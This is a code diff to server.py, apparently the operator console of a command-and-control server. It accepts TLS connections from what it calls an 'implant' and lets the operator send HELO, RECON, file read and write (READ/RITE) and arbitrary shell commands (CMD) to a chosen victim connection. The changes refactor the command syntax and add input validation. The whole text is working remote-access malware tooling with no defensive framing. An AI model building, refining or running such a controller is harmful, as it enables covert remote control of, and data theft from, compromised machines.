@@ -1,3 +1,4 @@
+# server.py (command‑first syntax: HELO 0 | RECON 0 | CMD 0 ls)
 import socket
 import ssl
 import random
@@ -11,8 +12,10 @@ types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR', 'RECON']
 lock = threading.Lock()
 addresses = []
 
+# ----------------------------------------------------------------------
+# Server‑local helpers
+# ----------------------------------------------------------------------
 def list_connections():
-    """Print currently connected clients."""
     with lock:
         if not addresses:
             print("No connections yet.")
@@ -22,22 +25,27 @@ def list_connections():
             print(f"\t[{idx}]: {addr}")
 
 def show_help():
-    print("Usage: [command] [connection id] [params...]")
-    print("Server local commands: 'help', 'listconns'")
-    print("Client affecting commands: HELO, EXIT, CMD <cmd>, RECON")
-    print("Example: 0 CMD ls")
-    print("         0 RECON")
+    print("Usage: <command> <connection_id> [params...]")
+    print("Server commands (no ID): 'help', 'listconns'")
+    print("Client commands: HELO, EXIT, CMD <cmd>, RECON")
+    print("Examples: HELO 0")
+    print("          RECON 0")
+    print("          CMD 0 ls")
 
+# ----------------------------------------------------------------------
+# Command input thread
+# ----------------------------------------------------------------------
 def parseAndSendInput():
     while True:
         try:
-            user_input = input('> ').split()
+            raw = input('> ')
+            user_input = raw.split()
             if not user_input:
                 continue
 
             command = user_input[0]
 
-            # ---- Server-local commands ----
+            # ---- server‑local commands (no ID) ----
             if command == 'listconns':
                 list_connections()
                 continue
@@ -45,28 +53,35 @@ def parseAndSendInput():
                 show_help()
                 continue
 
-            # ---- Client commands require an index ----
+            # ---- client commands require at least an index ----
             if len(user_input) < 2:
-                print("Error: missing connection index. Usage: <index> <command> [args]")
+                print("Error: missing connection index. Use '<command> <id>'")
+                show_help()
                 continue
 
-            idx = int(user_input[1])
+            index_str = user_input[1]
+            try:
+                idx = int(index_str)
+            except ValueError:
+                print(f"Invalid connection index '{index_str}'. Use an integer.")
+                continue
+
             with lock:
                 if idx >= len(addresses):
                     print(f"No connection at index {idx}")
                     continue
                 addr, conn = addresses[idx]
 
-            msg_type = command.upper()   # case-insensitive
+            msg_type = command.upper()
             if msg_type not in types:
                 print(f"Unknown command type: {msg_type}")
+                show_help()
                 continue
 
             # Build message
             msg_id = str(random.randint(0, 10**9))
             data = " ".join(user_input[2:]) if len(user_input) > 2 else ""
 
-            # Validate data presence
             if msg_type in ['READ', 'RITE', 'CMD'] and not data:
                 print(f"{msg_type} requires additional arguments")
                 continue
@@ -78,12 +93,13 @@ def parseAndSendInput():
             with lock:
                 conn.send(payload)
 
-        except ValueError:
-            print("Invalid connection index. Use an integer.")
         except Exception as e:
             print(f"Something went wrong: {e}")
             show_help()
 
+# ----------------------------------------------------------------------
+# Message receiving thread (prints replies from implant)
+# ----------------------------------------------------------------------
 def receiveMessage(c: ssl.SSLSocket):
     while True:
         try:
@@ -97,11 +113,12 @@ def receiveMessage(c: ssl.SSLSocket):
             print(f"[!] Error decoding response: {e}")
             break
 
-# Create SSL context for the server
+# ----------------------------------------------------------------------
+# Main server setup
+# ----------------------------------------------------------------------
 ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 ssl_context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
 
-# Set up a socket and listen for a connection
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
     raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     raw_socket.bind((host, port))
